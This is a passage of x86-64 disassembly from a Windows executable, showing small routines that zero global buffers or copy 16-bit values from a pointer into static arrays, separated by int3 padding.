   140008f93:	0f 11 05 36 59 28 00 	movups %xmm0,0x285936(%rip)        # 0x14028e8d0
   140008f9a:	0f 11 05 1f 59 28 00 	movups %xmm0,0x28591f(%rip)        # 0x14028e8c0
   140008fa1:	0f 11 05 08 59 28 00 	movups %xmm0,0x285908(%rip)        # 0x14028e8b0
   140008fa8:	48 c7 05 2d 59 28 00 	movq   $0x0,0x28592d(%rip)        # 0x14028e8e0
   140008faf:	00 00 00 00 
   140008fb3:	c3                   	ret
   140008fb4:	cc                   	int3
   140008fb5:	cc                   	int3
   140008fb6:	cc                   	int3
   140008fb7:	cc                   	int3
   140008fb8:	cc                   	int3
   140008fb9:	cc                   	int3
   140008fba:	cc                   	int3
   140008fbb:	cc                   	int3
   140008fbc:	cc                   	int3
   140008fbd:	cc                   	int3
   140008fbe:	cc                   	int3
   140008fbf:	cc                   	int3
   140008fc0:	c6 05 61 59 28 00 01 	movb   $0x1,0x285961(%rip)        # 0x14028e928
   140008fc7:	0f b7 01             	movzwl (%rcx),%eax
   140008fca:	66 89 05 1f 59 28 00 	mov    %ax,0x28591f(%rip)        # 0x14028e8f0
   140008fd1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008fd5:	66 89 05 16 59 28 00 	mov    %ax,0x285916(%rip)        # 0x14028e8f2
   140008fdc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008fe0:	66 89 05 0d 59 28 00 	mov    %ax,0x28590d(%rip)        # 0x14028e8f4
   140008fe7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008feb:	66 89 05 04 59 28 00 	mov    %ax,0x285904(%rip)        # 0x14028e8f6
   140008ff2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008ff6:	66 89 05 fb 58 28 00 	mov    %ax,0x2858fb(%rip)        # 0x14028e8f8
   140008ffd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009001:	66 89 05 f2 58 28 00 	mov    %ax,0x2858f2(%rip)        # 0x14028e8fa
   140009008:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000900c:	66 89 05 e9 58 28 00 	mov    %ax,0x2858e9(%rip)        # 0x14028e8fc
   140009013:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009017:	66 89 05 e0 58 28 00 	mov    %ax,0x2858e0(%rip)        # 0x14028e8fe
   14000901e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009022:	66 89 05 d7 58 28 00 	mov    %ax,0x2858d7(%rip)        # 0x14028e900
   140009029:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000902d:	66 89 05 ce 58 28 00 	mov    %ax,0x2858ce(%rip)        # 0x14028e902
   140009034:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009038:	66 89 05 c5 58 28 00 	mov    %ax,0x2858c5(%rip)        # 0x14028e904
   14000903f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009043:	66 89 05 bc 58 28 00 	mov    %ax,0x2858bc(%rip)        # 0x14028e906
   14000904a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000904e:	66 89 05 b3 58 28 00 	mov    %ax,0x2858b3(%rip)        # 0x14028e908
   140009055:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009059:	66 89 05 aa 58 28 00 	mov    %ax,0x2858aa(%rip)        # 0x14028e90a
   140009060:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009064:	66 89 05 a1 58 28 00 	mov    %ax,0x2858a1(%rip)        # 0x14028e90c
   14000906b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000906f:	66 89 05 98 58 28 00 	mov    %ax,0x285898(%rip)        # 0x14028e90e
   140009076:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000907a:	66 89 05 8f 58 28 00 	mov    %ax,0x28588f(%rip)        # 0x14028e910
   140009081:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009085:	66 89 05 86 58 28 00 	mov    %ax,0x285886(%rip)        # 0x14028e912
   14000908c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009090:	66 89 05 7d 58 28 00 	mov    %ax,0x28587d(%rip)        # 0x14028e914
   140009097:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000909b:	66 89 05 74 58 28 00 	mov    %ax,0x285874(%rip)        # 0x14028e916
   1400090a2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   1400090a6:	66 89 05 6b 58 28 00 	mov    %ax,0x28586b(%rip)        # 0x14028e918
   1400090ad:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   1400090b1:	66 89 05 62 58 28 00 	mov    %ax,0x285862(%rip)        # 0x14028e91a
   1400090b8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   1400090bc:	66 89 05 59 58 28 00 	mov    %ax,0x285859(%rip)        # 0x14028e91c
   1400090c3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   1400090c7:	66 89 05 50 58 28 00 	mov    %ax,0x285850(%rip)        # 0x14028e91e
   1400090ce:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   1400090d2:	66 89 05 47 58 28 00 	mov    %ax,0x285847(%rip)        # 0x14028e920
   1400090d9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   1400090dd:	66 89 05 3e 58 28 00 	mov    %ax,0x28583e(%rip)        # 0x14028e922
   1400090e4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   1400090e8:	66 89 05 35 58 28 00 	mov    %ax,0x285835(%rip)        # 0x14028e924
   1400090ef:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   1400090f3:	66 89 05 2c 58 28 00 	mov    %ax,0x28582c(%rip)        # 0x14028e926
   1400090fa:	c3                   	ret
   1400090fb:	cc                   	int3
   1400090fc:	cc                   	int3
   1400090fd:	cc                   	int3
   1400090fe:	cc                   	int3
   1400090ff:	cc                   	int3
   140009100:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009103:	0f 11 05 06 58 28 00 	movups %xmm0,0x285806(%rip)        # 0x14028e910
   14000910a:	0f 11 05 ef 57 28 00 	movups %xmm0,0x2857ef(%rip)        # 0x14028e900
   140009111:	0f 11 05 d8 57 28 00 	movups %xmm0,0x2857d8(%rip)        # 0x14028e8f0
   140009118:	48 c7 05 fd 57 28 00 	movq   $0x0,0x2857fd(%rip)        # 0x14028e920
   14000911f:	00 00 00 00 
   140009123:	c3                   	ret
   140009124:	cc                   	int3
   140009125:	cc                   	int3
   140009126:	cc                   	int3
   140009127:	cc                   	int3
   140009128:	cc                   	int3
   140009129:	cc                   	int3
   14000912a:	cc                   	int3
   14000912b:	cc                   	int3
   14000912c:	cc                   	int3
   14000912d:	cc                   	int3
   14000912e:	cc                   	int3
   14000912f:	cc                   	int3
   140009130:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009133:	0f 11 05 32 58 28 00 	movups %xmm0,0x285832(%rip)        # 0x14028e96c
   14000913a:	0f 29 05 1f 58 28 00 	movaps %xmm0,0x28581f(%rip)        # 0x14028e960
   140009141:	0f 29 05 08 58 28 00 	movaps %xmm0,0x285808(%rip)        # 0x14028e950
   140009148:	0f 29 05 f1 57 28 00 	movaps %xmm0,0x2857f1(%rip)        # 0x14028e940
   14000914f:	0f 29 05 da 57 28 00 	movaps %xmm0,0x2857da(%rip)        # 0x14028e930
   140009156:	c3                   	ret
   140009157:	cc                   	int3
   140009158:	cc                   	int3
   140009159:	cc                   	int3
   14000915a:	cc                   	int3
   14000915b:	cc                   	int3
   14000915c:	cc                   	int3
   14000915d:	cc                   	int3
   14000915e:	cc                   	int3
   14000915f:	cc                   	int3
   140009160:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009163:	0f 29 05 86 58 28 00 	movaps %xmm0,0x285886(%rip)        # 0x14028e9f0
   14000916a:	0f 29 05 6f 58 28 00 	movaps %xmm0,0x28586f(%rip)        # 0x14028e9e0
   140009171:	0f 29 05 58 58 28 00 	movaps %xmm0,0x285858(%rip)        # 0x14028e9d0
   140009178:	0f 29 05 41 58 28 00 	movaps %xmm0,0x285841(%rip)        # 0x14028e9c0
   14000917f:	0f 29 05 2a 58 28 00 	movaps %xmm0,0x28582a(%rip)        # 0x14028e9b0
   140009186:	0f 29 05 13 58 28 00 	movaps %xmm0,0x285813(%rip)        # 0x14028e9a0
   14000918d:	0f 29 05 fc 57 28 00 	movaps %xmm0,0x2857fc(%rip)        # 0x14028e990
   140009194:	0f 29 05 e5 57 28 00 	movaps %xmm0,0x2857e5(%rip)        # 0x14028e980
   14000919b:	c7 05 5b 58 28 00 00 	movl   $0x0,0x28585b(%rip)        # 0x14028ea00
   1400091a2:	00 00 00 
   1400091a5:	c3                   	ret
   1400091a6:	cc                   	int3
   1400091a7:	cc                   	int3
   1400091a8:	cc                   	int3
   1400091a9:	cc                   	int3
   1400091aa:	cc                   	int3
   1400091ab:	cc                   	int3
   1400091ac:	cc                   	int3
   1400091ad:	cc                   	int3
   1400091ae:	cc                   	int3
   1400091af:	cc                   	int3
   1400091b0:	c6 05 7b 58 28 00 01 	movb   $0x1,0x28587b(%rip)        # 0x14028ea32
   1400091b7:	0f b7 01             	movzwl (%rcx),%eax
   1400091ba:	66 89 05 4f 58 28 00 	mov    %ax,0x28584f(%rip)        # 0x14028ea10
   1400091c1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   1400091c5:	66 89 05 46 58 28 00 	mov    %ax,0x285846(%rip)        # 0x14028ea12
   1400091cc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   1400091d0:	66 89 05 3d 58 28 00 	mov    %ax,0x28583d(%rip)        # 0x14028ea14
   1400091d7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400091db:	66 89 05 34 58 28 00 	mov    %ax,0x285834(%rip)        # 0x14028ea16
   1400091e2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400091e6:	66 89 05 2b 58 28 00 	mov    %ax,0x28582b(%rip)        # 0x14028ea18
   1400091ed:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400091f1:	66 89 05 22 58 28 00 	mov    %ax,0x285822(%rip)        # 0x14028ea1a
   1400091f8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400091fc:	66 89 05 19 58 28 00 	mov    %ax,0x285819(%rip)        # 0x14028ea1c
   140009203:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009207:	66 89 05 10 58 28 00 	mov    %ax,0x285810(%rip)        # 0x14028ea1e
   14000920e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009212:	66 89 05 07 58 28 00 	mov    %ax,0x285807(%rip)        # 0x14028ea20
   140009219:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000921d:	66 89 05 fe 57 28 00 	mov    %ax,0x2857fe(%rip)        # 0x14028ea22
   140009224:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009228:	66 89 05 f5 57 28 00 	mov    %ax,0x2857f5(%rip)        # 0x14028ea24
   14000922f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009233:	66 89 05 ec 57 28 00 	mov    %ax,0x2857ec(%rip)        # 0x14028ea26
   14000923a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000923e:	66 89 05 e3 57 28 00 	mov    %ax,0x2857e3(%rip)        # 0x14028ea28
   140009245:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009249:	66 89 05 da 57 28 00 	mov    %ax,0x2857da(%rip)        # 0x14028ea2a
   140009250:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009254:	66 89 05 d1 57 28 00 	mov    %ax,0x2857d1(%rip)        # 0x14028ea2c
   14000925b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000925f:	66 89 05 c8 57 28 00 	mov    %ax,0x2857c8(%rip)        # 0x14028ea2e
   140009266:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000926a:	66 89 05 bf 57 28 00 	mov    %ax,0x2857bf(%rip)        # 0x14028ea30
   140009271:	c3                   	ret
   140009272:	cc                   	int3
   140009273:	cc                   	int3
   140009274:	cc                   	int3
   140009275:	cc                   	int3
   140009276:	cc                   	int3
   140009277:	cc                   	int3
   140009278:	cc                   	int3
   140009279:	cc                   	int3
   14000927a:	cc                   	int3
   14000927b:	cc                   	int3
   14000927c:	cc                   	int3
   14000927d:	cc                   	int3
   14000927e:	cc                   	int3
   14000927f:	cc                   	int3
   140009280:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009283:	0f 29 05 96 57 28 00 	movaps %xmm0,0x285796(%rip)        # 0x14028ea20
   14000928a:	0f 29 05 7f 57 28 00 	movaps %xmm0,0x28577f(%rip)        # 0x14028ea10
   140009291:	66 c7 05 96 57 28 00 	movw   $0x0,0x285796(%rip)        # 0x14028ea30
   140009298:	00 00 
   14000929a:	c3                   	ret
   14000929b:	cc                   	int3
   14000929c:	cc                   	int3
   14000929d:	cc                   	int3
   14000929e:	cc                   	int3
   14000929f:	cc                   	int3
   1400092a0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400092a3:	0f 11 05 d0 57 28 00 	movups %xmm0,0x2857d0(%rip)        # 0x14028ea7a
   1400092aa:	0f 29 05 bf 57 28 00 	movaps %xmm0,0x2857bf(%rip)        # 0x14028ea70
   1400092b1:	0f 29 05 a8 57 28 00 	movaps %xmm0,0x2857a8(%rip)        # 0x14028ea60
   1400092b8:	0f 29 05 91 57 28 00 	movaps %xmm0,0x285791(%rip)        # 0x14028ea50
   1400092bf:	0f 29 05 7a 57 28 00 	movaps %xmm0,0x28577a(%rip)        # 0x14028ea40
   1400092c6:	c3                   	ret
   1400092c7:	cc                   	int3
   1400092c8:	cc                   	int3
   1400092c9:	cc                   	int3
   1400092ca:	cc                   	int3
   1400092cb:	cc                   	int3
   1400092cc:	cc                   	int3
   1400092cd:	cc                   	int3
   1400092ce:	cc                   	int3
   1400092cf:	cc                   	int3
   1400092d0:	c6 05 f9 57 28 00 01 	movb   $0x1,0x2857f9(%rip)        # 0x14028ead0
   1400092d7:	0f b7 01             	movzwl (%rcx),%eax
   1400092da:	66 89 05 af 57 28 00 	mov    %ax,0x2857af(%rip)        # 0x14028ea90
   1400092e1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   1400092e5:	66 89 05 a6 57 28 00 	mov    %ax,0x2857a6(%rip)        # 0x14028ea92
   1400092ec:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   1400092f0:	66 89 05 9d 57 28 00 	mov    %ax,0x28579d(%rip)        # 0x14028ea94
   1400092f7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400092fb:	66 89 05 94 57 28 00 	mov    %ax,0x285794(%rip)        # 0x14028ea96
   140009302:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140009306:	66 89 05 8b 57 28 00 	mov    %ax,0x28578b(%rip)        # 0x14028ea98
   14000930d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140009311:	66 89 05 82 57 28 00 	mov    %ax,0x285782(%rip)        # 0x14028ea9a
   140009318:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000931c:	66 89 05 79 57 28 00 	mov    %ax,0x285779(%rip)        # 0x14028ea9c
   140009323:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009327:	66 89 05 70 57 28 00 	mov    %ax,0x285770(%rip)        # 0x14028ea9e
   14000932e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009332:	66 89 05 67 57 28 00 	mov    %ax,0x285767(%rip)        # 0x14028eaa0
   140009339:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000933d:	66 89 05 5e 57 28 00 	mov    %ax,0x28575e(%rip)        # 0x14028eaa2
   140009344:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009348:	66 89 05 55 57 28 00 	mov    %ax,0x285755(%rip)        # 0x14028eaa4
   14000934f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009353:	66 89 05 4c 57 28 00 	mov    %ax,0x28574c(%rip)        # 0x14028eaa6
   14000935a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000935e:	66 89 05 43 57 28 00 	mov    %ax,0x285743(%rip)        # 0x14028eaa8
   140009365:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009369:	66 89 05 3a 57 28 00 	mov    %ax,0x28573a(%rip)        # 0x14028eaaa
   140009370:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009374:	66 89 05 31 57 28 00 	mov    %ax,0x285731(%rip)        # 0x14028eaac
   14000937b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000937f:	66 89 05 28 57 28 00 	mov    %ax,0x285728(%rip)        # 0x14028eaae
   140009386:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000938a:	66 89 05 1f 57 28 00 	mov    %ax,0x28571f(%rip)        # 0x14028eab0
   140009391:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009395:	66 89 05 16 57 28 00 	mov    %ax,0x285716(%rip)        # 0x14028eab2
   14000939c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   1400093a0:	66 89 05 0d 57 28 00 	mov    %ax,0x28570d(%rip)        # 0x14028eab4
   1400093a7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   1400093ab:	66 89 05 04 57 28 00 	mov    %ax,0x285704(%rip)        # 0x14028eab6
   1400093b2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   1400093b6:	66 89 05 fb 56 28 00 	mov    %ax,0x2856fb(%rip)        # 0x14028eab8
   1400093bd:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   1400093c1:	66 89 05 f2 56 28 00 	mov    %ax,0x2856f2(%rip)        # 0x14028eaba
   1400093c8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   1400093cc:	66 89 05 e9 56 28 00 	mov    %ax,0x2856e9(%rip)        # 0x14028eabc
   1400093d3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   1400093d7:	66 89 05 e0 56 28 00 	mov    %ax,0x2856e0(%rip)        # 0x14028eabe
   1400093de:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   1400093e2:	66 89 05 d7 56 28 00 	mov    %ax,0x2856d7(%rip)        # 0x14028eac0
   1400093e9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   1400093ed:	66 89 05 ce 56 28 00 	mov    %ax,0x2856ce(%rip)        # 0x14028eac2
   1400093f4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   1400093f8:	66 89 05 c5 56 28 00 	mov    %ax,0x2856c5(%rip)        # 0x14028eac4
   1400093ff:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140009403:	66 89 05 bc 56 28 00 	mov    %ax,0x2856bc(%rip)        # 0x14028eac6
   14000940a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   14000940e:	66 89 05 b3 56 28 00 	mov    %ax,0x2856b3(%rip)        # 0x14028eac8
   140009415:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140009419:	66 89 05 aa 56 28 00 	mov    %ax,0x2856aa(%rip)        # 0x14028eaca
   140009420:	0f b7 41 3c          	movzwl 0x3c(%rcx),%eax
   140009424:	66 89 05 a1 56 28 00 	mov    %ax,0x2856a1(%rip)        # 0x14028eacc
   14000942b:	0f b7 41 3e          	movzwl 0x3e(%rcx),%eax
   14000942f:	66 89 05 98 56 28 00 	mov    %ax,0x285698(%rip)        # 0x14028eace
   140009436:	c3                   	ret
   140009437:	cc                   	int3
   140009438:	cc                   	int3
   140009439:	cc                   	int3
   14000943a:	cc                   	int3
   14000943b:	cc                   	int3
   14000943c:	cc                   	int3
   14000943d:	cc                   	int3
   14000943e:	cc                   	int3
   14000943f:	cc                   	int3
   140009440:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009443:	0f 29 05 76 56 28 00 	movaps %xmm0,0x285676(%rip)        # 0x14028eac0
   14000944a:	0f 29 05 5f 56 28 00 	movaps %xmm0,0x28565f(%rip)        # 0x14028eab0
   140009451:	0f 29 05 48 56 28 00 	movaps %xmm0,0x285648(%rip)        # 0x14028eaa0
   140009458:	0f 29 05 31 56 28 00 	movaps %xmm0,0x285631(%rip)        # 0x14028ea90
   14000945f:	c3                   	ret
   140009460:	c7 05 76 56 28 00 00 	movl   $0x0,0x285676(%rip)        # 0x14028eae0
   140009467:	00 00 00 
   14000946a:	48 c7 05 63 56 28 00 	movq   $0x0,0x285663(%rip)        # 0x14028ead8
   140009471:	00 00 00 00 
   140009475:	c3                   	ret
   140009476:	cc                   	int3
   140009477:	cc                   	int3
   140009478:	cc                   	int3
   140009479:	cc                   	int3
   14000947a:	cc                   	int3
   14000947b:	cc                   	int3
   14000947c:	cc                   	int3
   14000947d:	cc                   	int3
   14000947e:	cc                   	int3
   14000947f:	cc                   	int3
   140009480:	c6 05 8d 56 28 00 01 	movb   $0x1,0x28568d(%rip)        # 0x14028eb14
   140009487:	0f b7 01             	movzwl (%rcx),%eax
   14000948a:	66 89 05 5f 56 28 00 	mov    %ax,0x28565f(%rip)        # 0x14028eaf0
   140009491:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140009495:	66 89 05 56 56 28 00 	mov    %ax,0x285656(%rip)        # 0x14028eaf2
   14000949c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   1400094a0:	66 89 05 4d 56 28 00 	mov    %ax,0x28564d(%rip)        # 0x14028eaf4
   1400094a7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400094ab:	66 89 05 44 56 28 00 	mov    %ax,0x285644(%rip)        # 0x14028eaf6
   1400094b2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400094b6:	66 89 05 3b 56 28 00 	mov    %ax,0x28563b(%rip)        # 0x14028eaf8
   1400094bd:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400094c1:	66 89 05 32 56 28 00 	mov    %ax,0x285632(%rip)        # 0x14028eafa
   1400094c8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400094cc:	66 89 05 29 56 28 00 	mov    %ax,0x285629(%rip)        # 0x14028eafc
   1400094d3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   1400094d7:	66 89 05 20 56 28 00 	mov    %ax,0x285620(%rip)        # 0x14028eafe
   1400094de:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   1400094e2:	66 89 05 17 56 28 00 	mov    %ax,0x285617(%rip)        # 0x14028eb00
   1400094e9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   1400094ed:	66 89 05 0e 56 28 00 	mov    %ax,0x28560e(%rip)        # 0x14028eb02
   1400094f4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1400094f8:	66 89 05 05 56 28 00 	mov    %ax,0x285605(%rip)        # 0x14028eb04
   1400094ff:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009503:	66 89 05 fc 55 28 00 	mov    %ax,0x2855fc(%rip)        # 0x14028eb06
   14000950a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000950e:	66 89 05 f3 55 28 00 	mov    %ax,0x2855f3(%rip)        # 0x14028eb08
   140009515:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009519:	66 89 05 ea 55 28 00 	mov    %ax,0x2855ea(%rip)        # 0x14028eb0a
   140009520:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009524:	66 89 05 e1 55 28 00 	mov    %ax,0x2855e1(%rip)        # 0x14028eb0c
   14000952b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000952f:	66 89 05 d8 55 28 00 	mov    %ax,0x2855d8(%rip)        # 0x14028eb0e
   140009536:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000953a:	66 89 05 cf 55 28 00 	mov    %ax,0x2855cf(%rip)        # 0x14028eb10
   140009541:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009545:	66 89 05 c6 55 28 00 	mov    %ax,0x2855c6(%rip)        # 0x14028eb12
   14000954c:	c3                   	ret
   14000954d:	cc                   	int3
   14000954e:	cc                   	int3
   14000954f:	cc                   	int3
   140009550:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009553:	0f 29 05 a6 55 28 00 	movaps %xmm0,0x2855a6(%rip)        # 0x14028eb00
   14000955a:	0f 29 05 8f 55 28 00 	movaps %xmm0,0x28558f(%rip)        # 0x14028eaf0
   140009561:	c7 05 a5 55 28 00 00 	movl   $0x0,0x2855a5(%rip)        # 0x14028eb10
   140009568:	00 00 00 
   14000956b:	c3                   	ret
   14000956c:	cc                   	int3
   14000956d:	cc                   	int3
   14000956e:	cc                   	int3
   14000956f:	cc                   	int3
   140009570:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009573:	0f 29 05 a6 55 28 00 	movaps %xmm0,0x2855a6(%rip)        # 0x14028eb20
   14000957a:	48 c7 05 ab 55 28 00 	movq   $0x0,0x2855ab(%rip)        # 0x14028eb30
   140009581:	00 00 00 00 
   140009585:	c3                   	ret
   140009586:	cc                   	int3
   140009587:	cc                   	int3
   140009588:	cc                   	int3
   140009589:	cc                   	int3
   14000958a:	cc                   	int3
   14000958b:	cc                   	int3
   14000958c:	cc                   	int3
   14000958d:	cc                   	int3
   14000958e:	cc                   	int3
   14000958f:	cc                   	int3
   140009590:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009593:	0f 11 05 b2 55 28 00 	movups %xmm0,0x2855b2(%rip)        # 0x14028eb4c
   14000959a:	0f 29 05 9f 55 28 00 	movaps %xmm0,0x28559f(%rip)        # 0x14028eb40
   1400095a1:	c3                   	ret
   1400095a2:	cc                   	int3
   1400095a3:	cc                   	int3
   1400095a4:	cc                   	int3
   1400095a5:	cc                   	int3
   1400095a6:	cc                   	int3
   1400095a7:	cc                   	int3
   1400095a8:	cc                   	int3
   1400095a9:	cc                   	int3
   1400095aa:	cc                   	int3
   1400095ab:	cc                   	int3
   1400095ac:	cc                   	int3
   1400095ad:	cc                   	int3
   1400095ae:	cc                   	int3
   1400095af:	cc                   	int3
   1400095b0:	c6 05 ef 55 28 00 01 	movb   $0x1,0x2855ef(%rip)        # 0x14028eba6
   1400095b7:	0f b7 01             	movzwl (%rcx),%eax
   1400095ba:	66 89 05 9f 55 28 00 	mov    %ax,0x28559f(%rip)        # 0x14028eb60
   1400095c1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   1400095c5:	66 89 05 96 55 28 00 	mov    %ax,0x285596(%rip)        # 0x14028eb62
   1400095cc:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   1400095d0:	66 89 05 8d 55 28 00 	mov    %ax,0x28558d(%rip)        # 0x14028eb64
   1400095d7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400095db:	66 89 05 84 55 28 00 	mov    %ax,0x285584(%rip)        # 0x14028eb66
   1400095e2:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   1400095e6:	66 89 05 7b 55 28 00 	mov    %ax,0x28557b(%rip)        # 0x14028eb68
   1400095ed:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   1400095f1:	66 89 05 72 55 28 00 	mov    %ax,0x285572(%rip)        # 0x14028eb6a
   1400095f8:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400095fc:	66 89 05 69 55 28 00 	mov    %ax,0x285569(%rip)        # 0x14028eb6c
   140009603:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140009607:	66 89 05 60 55 28 00 	mov    %ax,0x285560(%rip)        # 0x14028eb6e
   14000960e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140009612:	66 89 05 57 55 28 00 	mov    %ax,0x285557(%rip)        # 0x14028eb70
   140009619:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000961d:	66 89 05 4e 55 28 00 	mov    %ax,0x28554e(%rip)        # 0x14028eb72
   140009624:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140009628:	66 89 05 45 55 28 00 	mov    %ax,0x285545(%rip)        # 0x14028eb74
   14000962f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140009633:	66 89 05 3c 55 28 00 	mov    %ax,0x28553c(%rip)        # 0x14028eb76
   14000963a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   14000963e:	66 89 05 33 55 28 00 	mov    %ax,0x285533(%rip)        # 0x14028eb78
   140009645:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140009649:	66 89 05 2a 55 28 00 	mov    %ax,0x28552a(%rip)        # 0x14028eb7a
   140009650:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140009654:	66 89 05 21 55 28 00 	mov    %ax,0x285521(%rip)        # 0x14028eb7c
   14000965b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   14000965f:	66 89 05 18 55 28 00 	mov    %ax,0x285518(%rip)        # 0x14028eb7e
   140009666:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   14000966a:	66 89 05 0f 55 28 00 	mov    %ax,0x28550f(%rip)        # 0x14028eb80
   140009671:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140009675:	66 89 05 06 55 28 00 	mov    %ax,0x285506(%rip)        # 0x14028eb82
   14000967c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140009680:	66 89 05 fd 54 28 00 	mov    %ax,0x2854fd(%rip)        # 0x14028eb84
   140009687:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   14000968b:	66 89 05 f4 54 28 00 	mov    %ax,0x2854f4(%rip)        # 0x14028eb86
